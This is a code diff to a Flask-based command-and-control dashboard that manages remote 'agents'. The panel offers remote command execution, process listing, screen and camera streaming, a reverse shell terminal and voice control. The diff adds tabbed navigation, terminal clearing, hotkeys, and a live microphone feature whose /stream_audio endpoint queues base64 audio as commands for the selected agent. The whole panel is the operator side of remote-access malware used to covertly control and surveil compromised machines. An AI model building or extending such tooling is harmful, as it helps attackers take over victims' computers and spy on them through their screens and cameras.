@@ -76,8 +76,67 @@ DASHBOARD_HTML = """
 
         .header {
             text-align: center;
-            margin-bottom: 40px;
+            margin-bottom: 20px;
             padding: 30px 0;
+        }
+
+        /* Navigation Bar Styles */
+        .nav-bar {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 15px;
+            padding: 15px 25px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+
+        .nav-item {
+            background: var(--tertiary-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 12px 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Orbitron', monospace;
+            font-weight: 600;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .nav-item:hover {
+            border-color: var(--accent-blue);
+            box-shadow: 0 4px 20px rgba(0, 212, 255, 0.3);
+            transform: translateY(-2px);
+        }
+
+        .nav-item.active {
+            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
+            border-color: var(--accent-blue);
+            color: white;
+            box-shadow: 0 6px 25px rgba(0, 212, 255, 0.4);
+        }
+
+        .nav-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transition: left 0.5s;
+        }
+
+        .nav-item:hover::before {
+            left: 100%;
         }
 
         .header h1 {
@@ -304,12 +363,115 @@ DASHBOARD_HTML = """
             white-space: pre-wrap;
             word-wrap: break-word;
             position: relative;
+            box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.5);
         }
 
         .output-terminal::before {
             content: "NEURAL_TERMINAL_v2.1 > ";
             color: var(--accent-blue);
             font-weight: bold;
+        }
+
+        .enhanced-terminal {
+            background: linear-gradient(135deg, #000 0%, #1a1a2e 100%);
+            border: 2px solid var(--accent-blue);
+            box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
+        }
+
+        /* Voice Control Styles */
+        .voice-control-section {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .mic-button {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: none;
+            background: linear-gradient(45deg, var(--accent-red), #ff6b7a);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            position: relative;
+            box-shadow: 0 4px 15px rgba(255, 71, 87, 0.3);
+        }
+
+        .mic-button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 6px 25px rgba(255, 71, 87, 0.5);
+        }
+
+        .mic-button.active {
+            background: linear-gradient(45deg, var(--accent-green), #2ed573);
+            box-shadow: 0 6px 25px rgba(0, 255, 136, 0.5);
+            animation: pulse-mic 1.5s infinite;
+        }
+
+        .mic-button.active::after {
+            content: '';
+            position: absolute;
+            width: 80px;
+            height: 80px;
+            border: 2px solid var(--accent-green);
+            border-radius: 50%;
+            animation: mic-ripple 1.5s infinite;
+        }
+
+        @keyframes pulse-mic {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        @keyframes mic-ripple {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: scale(1.4);
+                opacity: 0;
+            }
+        }
+
+        .voice-status-display {
+            flex: 1;
+            background: var(--tertiary-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            color: var(--text-secondary);
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+        }
+
+        .voice-status-display.listening {
+            border-color: var(--accent-green);
+            color: var(--accent-green);
+            background: rgba(0, 255, 136, 0.05);
+        }
+
+        /* Tab Content Styles */
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .section-divider {
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--accent-blue), transparent);
+            margin: 30px 0;
+            border-radius: 1px;
         }
 
         .status-indicator {
@@ -390,6 +552,19 @@ DASHBOARD_HTML = """
             <p class="subtitle">Advanced Command & Control Interface</p>
         </div>
 
+        <!-- Navigation Bar -->
+        <div class="nav-bar">
+            <div class="nav-item active" onclick="switchTab('commands')" id="nav-commands">
+                ⚡ Command Execution
+            </div>
+            <div class="nav-item" onclick="switchTab('shell')" id="nav-shell">
+                🐚 Reverse Shell
+            </div>
+            <div class="nav-item" onclick="switchTab('voice')" id="nav-voice">
+                🎤 Voice Control
+            </div>
+        </div>
+
         <div class="grid">
             <!-- Agents Panel -->
             <div class="panel">
@@ -410,7 +585,7 @@ DASHBOARD_HTML = """
             <div class="panel">
                 <div class="panel-header">
                     <div class="panel-icon">⚡</div>
-                    <div class="panel-title">Command Interface</div>
+                    <div class="panel-title">Control Interface</div>
                 </div>
                 
                 <div class="control-section">
@@ -422,46 +597,68 @@ DASHBOARD_HTML = """
                         </div>
                     </div>
 
-                    <div class="control-group">
-                        <div class="control-header">Command Execution</div>
-                        <div class="input-group">
-                            <label class="input-label">Command</label>
-                            <input type="text" class="neural-input" id="command" placeholder="Enter command to execute...">
+                    <!-- Command Execution Tab -->
+                    <div id="tab-commands" class="tab-content active">
+                        <div class="control-group">
+                            <div class="control-header">Command Execution</div>
+                            <div class="input-group">
+                                <label class="input-label">Command</label>
+                                <input type="text" class="neural-input" id="command" placeholder="Enter command to execute...">
+                            </div>
+                            <button class="btn" onclick="issueCommand()">Execute Command</button>
+                            <button class="btn btn-success" onclick="getOutput()">Retrieve Output</button>
+                            <div id="command-status" class="status-indicator"></div>
                         </div>
-                        <button class="btn" onclick="issueCommand()">Execute Command</button>
-                        <button class="btn btn-success" onclick="getOutput()">Retrieve Output</button>
-                        <div id="command-status" class="status-indicator"></div>
-                    </div>
 
-                    <div class="control-group">
-                        <div class="control-header">Quick Actions</div>
-                        <button class="btn" onclick="listProcesses()">List Processes</button>
-                        <button class="btn" onclick="startScreenStream()">Screen Stream</button>
-                        <button class="btn" onclick="startCameraStream()">Camera Stream</button>
-                        <button class="btn btn-danger" onclick="stopAllStreams()">Stop All Streams</button>
-                    </div>
-
-                    <div class="control-group">
-                        <div class="control-header">Reverse Shell</div>
-                        <button class="btn" onclick="startReverseShell()">Start Reverse Shell</button>
-                        <button class="btn btn-danger" onclick="stopReverseShell()">Stop Reverse Shell</button>
-                        <div class="input-group">
-                            <label class="input-label">Shell Command</label>
-                            <input type="text" class="neural-input" id="shell-command" placeholder="Enter shell command...">
+                        <div class="control-group">
+                            <div class="control-header">Quick Actions</div>
+                            <button class="btn" onclick="listProcesses()">List Processes</button>
+                            <button class="btn" onclick="startScreenStream()">Screen Stream</button>
+                            <button class="btn" onclick="startCameraStream()">Camera Stream</button>
+                            <button class="btn btn-danger" onclick="stopAllStreams()">Stop All Streams</button>
                         </div>
-                        <button class="btn" onclick="executeShellCommand()">Execute Shell Command</button>
-                        <div id="shell-status" class="status-indicator"></div>
                     </div>
 
-                    <div class="control-group">
-                        <div class="control-header">Voice Control</div>
-                        <button class="btn" onclick="startVoiceControl()">Start Voice Control</button>
-                        <button class="btn btn-danger" onclick="stopVoiceControl()">Stop Voice Control</button>
-                        <div id="voice-status" class="status-indicator"></div>
-                        <div class="voice-commands-info">
-                            <small style="color: var(--text-secondary);">
-                                Voice commands: "screenshot", "start camera", "stop camera", "start streaming", "stop streaming", "system info", "list processes", "current directory", "run [command]"
-                            </small>
+                    <!-- Reverse Shell Tab -->
+                    <div id="tab-shell" class="tab-content">
+                        <div class="control-group">
+                            <div class="control-header">Reverse Shell</div>
+                            <button class="btn" onclick="startReverseShell()">Start Reverse Shell</button>
+                            <button class="btn btn-danger" onclick="stopReverseShell()">Stop Reverse Shell</button>
+                            <div class="input-group">
+                                <label class="input-label">Shell Command</label>
+                                <input type="text" class="neural-input" id="shell-command" placeholder="Enter shell command...">
+                            </div>
+                            <button class="btn" onclick="executeShellCommand()">Execute Shell Command</button>
+                            <div id="shell-status" class="status-indicator"></div>
+                        </div>
+                    </div>
+
+                    <!-- Voice Control Tab -->
+                    <div id="tab-voice" class="tab-content">
+                        <div class="control-group">
+                            <div class="control-header">Voice Control</div>
+                            <button class="btn" onclick="startVoiceControl()">Start Voice Control</button>
+                            <button class="btn btn-danger" onclick="stopVoiceControl()">Stop Voice Control</button>
+                            <div id="voice-status" class="status-indicator"></div>
+                            
+                            <div class="section-divider"></div>
+                            
+                            <div class="control-header">Live Microphone</div>
+                            <div class="voice-control-section">
+                                <button class="mic-button" id="mic-button" onclick="toggleMicrophone()">
+                                    🎤
+                                </button>
+                                <div class="voice-status-display" id="voice-display">
+                                    Click the microphone to start live voice streaming to the agent
+                                </div>
+                            </div>
+                            
+                            <div class="voice-commands-info" style="margin-top: 15px;">
+                                <small style="color: var(--text-secondary);">
+                                    Voice commands: "screenshot", "start camera", "stop camera", "start streaming", "stop streaming", "system info", "list processes", "current directory", "run [command]"
+                                </small>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -473,8 +670,9 @@ DASHBOARD_HTML = """
             <div class="panel-header">
                 <div class="panel-icon">💻</div>
                 <div class="panel-title">Neural Terminal</div>
+                <button class="btn" onclick="clearTerminal('output-display')" style="margin-left: auto; padding: 6px 12px; font-size: 0.8rem;">Clear</button>
             </div>
-            <div class="output-terminal" id="output-display">System ready. Awaiting commands...</div>
+            <div class="output-terminal enhanced-terminal" id="output-display">System ready. Awaiting commands...</div>
         </div>
 
         <!-- Reverse Shell Terminal -->
@@ -482,8 +680,9 @@ DASHBOARD_HTML = """
             <div class="panel-header">
                 <div class="panel-icon">🐚</div>
                 <div class="panel-title">Reverse Shell Terminal</div>
+                <button class="btn" onclick="clearTerminal('shell-output-display')" style="margin-left: auto; padding: 6px 12px; font-size: 0.8rem;">Clear</button>
             </div>
-            <div class="output-terminal" id="shell-output-display">Reverse shell not connected. Start reverse shell to begin...</div>
+            <div class="output-terminal enhanced-terminal" id="shell-output-display">Reverse shell not connected. Start reverse shell to begin...</div>
         </div>
 
         <!-- Hidden audio player for streams -->
@@ -496,6 +695,146 @@ DASHBOARD_HTML = """
         let videoWindow = null;
         let cameraWindow = null;
         let audioPlayer = null;
+        let microphoneStream = null;
+        let microphoneActive = false;
+        let audioContext = null;
+        let mediaRecorder = null;
+
+        // Navigation Tab Functions
+        function switchTab(tabName) {
+            // Remove active class from all nav items
+            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+            
+            // Hide all tab contents
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+            
+            // Activate selected nav item and tab content
+            document.getElementById(`nav-${tabName}`).classList.add('active');
+            document.getElementById(`tab-${tabName}`).classList.add('active');
+        }
+
+        // Clear Terminal Function
+        function clearTerminal(terminalId) {
+            const terminal = document.getElementById(terminalId);
+            if (terminalId === 'output-display') {
+                terminal.textContent = 'Terminal cleared. Ready for commands...';
+            } else if (terminalId === 'shell-output-display') {
+                terminal.textContent = 'Shell terminal cleared. Ready for commands...';
+            }
+        }
+
+        // Live Microphone Functions
+        async function toggleMicrophone() {
+            if (!selectedAgentId) {
+                showStatus('Please select an agent first.', 'error');
+                return;
+            }
+
+            const micButton = document.getElementById('mic-button');
+            const voiceDisplay = document.getElementById('voice-display');
+
+            if (!microphoneActive) {
+                try {
+                    // Request microphone access
+                    microphoneStream = await navigator.mediaDevices.getUserMedia({ 
+                        audio: {
+                            echoCancellation: true,
+                            noiseSuppression: true,
+                            sampleRate: 44100
+                        } 
+                    });
+                    
+                    // Set up audio context and recorder
+                    audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                    const source = audioContext.createMediaStreamSource(microphoneStream);
+                    
+                    // Set up MediaRecorder for streaming
+                    mediaRecorder = new MediaRecorder(microphoneStream, {
+                        mimeType: 'audio/webm;codecs=opus'
+                    });
+                    
+                    let audioChunks = [];
+                    
+                    mediaRecorder.ondataavailable = async (event) => {
+                        if (event.data.size > 0) {
+                            audioChunks.push(event.data);
+                            
+                            // Send audio chunk to agent
+                            if (audioChunks.length >= 10) { // Send every 10 chunks (~1 second)
+                                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                                await sendAudioToAgent(audioBlob);
+                                audioChunks = [];
+                            }
+                        }
+                    };
+                    
+                    mediaRecorder.start(100); // Collect data every 100ms
+                    
+                    microphoneActive = true;
+                    micButton.classList.add('active');
+                    voiceDisplay.classList.add('listening');
+                    voiceDisplay.textContent = '🎤 Live microphone active - Agent is hearing you!';
+                    
+                    showStatus('Live microphone started - Agent can hear you now!', 'success');
+                    
+                } catch (error) {
+                    console.error('Error accessing microphone:', error);
+                    showStatus('Error: Could not access microphone. Please check permissions.', 'error');
+                    voiceDisplay.textContent = 'Error: Microphone access denied. Please allow microphone permissions.';
+                }
+            } else {
+                // Stop microphone
+                stopMicrophone();
+            }
+        }
+
+        function stopMicrophone() {
+            if (microphoneStream) {
+                microphoneStream.getTracks().forEach(track => track.stop());
+                microphoneStream = null;
+            }
+            
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+            }
+            
+            if (audioContext) {
+                audioContext.close();
+                audioContext = null;
+            }
+            
+            microphoneActive = false;
+            const micButton = document.getElementById('mic-button');
+            const voiceDisplay = document.getElementById('voice-display');
+            
+            micButton.classList.remove('active');
+            voiceDisplay.classList.remove('listening');
+            voiceDisplay.textContent = 'Live microphone stopped. Click to start again.';
+            
+            showStatus('Live microphone stopped', 'success');
+        }
+
+        async function sendAudioToAgent(audioBlob) {
+            if (!selectedAgentId) return;
+            
+            try {
+                const formData = new FormData();
+                formData.append('audio', audioBlob, 'live_audio.webm');
+                formData.append('agent_id', selectedAgentId);
+                
+                await fetch('/stream_audio', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                // Update voice display with activity indicator
+                const voiceDisplay = document.getElementById('voice-display');
+                voiceDisplay.textContent = '🎤 Live microphone active - Streaming audio to agent... 📡';
+                
+            } catch (error) {
+                console.error('Error sending audio to agent:', error);
+            }
+        }
 
         function selectAgent(element, agentId) {
             const oldAgentId = selectedAgentId;
@@ -511,6 +850,12 @@ DASHBOARD_HTML = """
                 issueCommandInternal(oldAgentId, 'stop-stream');
                 issueCommandInternal(oldAgentId, 'stop-audio');
                 issueCommandInternal(oldAgentId, 'stop-camera');
+                issueCommandInternal(oldAgentId, 'stop-voice-control');
+            }
+
+            // Stop microphone if active
+            if (microphoneActive) {
+                stopMicrophone();
             }
 
             if (videoWindow && !videoWindow.closed) {
@@ -534,7 +879,15 @@ DASHBOARD_HTML = """
             selectedAgentId = agentId;
             document.getElementById('agent-id').value = agentId;
             document.getElementById('output-display').textContent = 'Agent selected. Ready for commands...';
+            document.getElementById('shell-output-display').textContent = 'Reverse shell not connected. Start reverse shell to begin...';
             document.getElementById('command-status').style.display = 'none';
+            document.getElementById('shell-status').style.display = 'none';
+            document.getElementById('voice-status').style.display = 'none';
+            
+            // Reset voice display
+            const voiceDisplay = document.getElementById('voice-display');
+            voiceDisplay.classList.remove('listening');
+            voiceDisplay.textContent = 'Click the microphone to start live voice streaming to the agent';
         }
 
         async function fetchAgents() {
@@ -864,6 +1217,10 @@ DASHBOARD_HTML = """
 
         // Enhanced keyboard shortcuts
         document.addEventListener('keydown', function(event) {
+            // Enter key in command input
+            if (event.target.id === 'command' && event.key === 'Enter') {
+                issueCommand();
+            }
             // Enter key in shell command input
             if (event.target.id === 'shell-command' && event.key === 'Enter') {
                 executeShellCommand();
@@ -871,12 +1228,25 @@ DASHBOARD_HTML = """
             // Ctrl+Shift+S for reverse shell
             if (event.ctrlKey && event.shiftKey && event.key === 'S') {
                 event.preventDefault();
+                switchTab('shell');
                 startReverseShell();
             }
             // Ctrl+Shift+V for voice control
             if (event.ctrlKey && event.shiftKey && event.key === 'V') {
                 event.preventDefault();
+                switchTab('voice');
                 startVoiceControl();
+            }
+            // Ctrl+Shift+M for microphone toggle
+            if (event.ctrlKey && event.shiftKey && event.key === 'M') {
+                event.preventDefault();
+                switchTab('voice');
+                toggleMicrophone();
+            }
+            // Ctrl+Shift+C for command tab
+            if (event.ctrlKey && event.shiftKey && event.key === 'C') {
+                event.preventDefault();
+                switchTab('commands');
             }
         });
 
@@ -1161,6 +1531,35 @@ def generate_audio_stream(agent_id):
 def audio_feed(agent_id):
     """Serves the WAV audio stream to the dashboard."""
     return Response(generate_audio_stream(agent_id), mimetype='audio/wav')
+
+@app.route("/stream_audio", methods=["POST"])
+def stream_audio():
+    """Receives live audio stream from dashboard microphone and forwards to agent."""
+    if 'audio' not in request.files:
+        return jsonify({"status": "error", "message": "No audio data provided"}), 400
+    
+    audio_file = request.files['audio']
+    agent_id = request.form.get('agent_id')
+    
+    if not agent_id:
+        return jsonify({"status": "error", "message": "agent_id required"}), 400
+    
+    try:
+        # Read audio data
+        audio_data = audio_file.read()
+        
+        # Encode audio as base64 for transmission
+        audio_b64 = base64.b64encode(audio_data).decode('utf-8')
+        
+        # Queue live audio command for the agent
+        live_audio_command = f"live-audio:{audio_b64}"
+        AGENTS_DATA[agent_id]["commands"].append(live_audio_command)
+        
+        return jsonify({"status": "success", "message": "Live audio streamed to agent"})
+        
+    except Exception as e:
+        print(f"Error processing live audio stream: {e}")
+        return jsonify({"status": "error", "message": "Failed to process audio stream"}), 500
 
 @app.route("/agents", methods=["GET"])
 def get_agents():
